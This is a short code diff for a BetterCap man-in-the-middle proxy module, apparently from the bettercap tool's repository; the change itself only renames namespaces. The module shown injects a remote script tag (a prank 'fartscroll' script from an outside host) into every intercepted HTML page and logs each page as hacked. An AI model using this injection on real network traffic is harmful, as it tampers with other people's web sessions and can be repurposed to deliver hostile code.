@@ -9,17 +9,17 @@ Blog   : http://www.evilsocket.net/
 This project is released under the GPL 3 license.
 
 =end
-class FartScroll < Proxy::Module
+class FartScroll < BetterCap::Proxy::Module
   def on_request( request, response )
     # is it a html page?
     if response.content_type =~ /^text\/html.*/
-      Logger.info "Hacking http://#{request.host}#{request.url}"
+      BetterCap::Logger.info "Hacking http://#{request.host}#{request.url}"
       # make sure to use sub! or gsub! to update the instance
       response.body.sub!( '</title>', '</title>
         <script src="http://code.onion.com/fartscroll.js"></script>
        <script>
             fartscroll(5);
-        
+
         </script> ' )
     end
   end
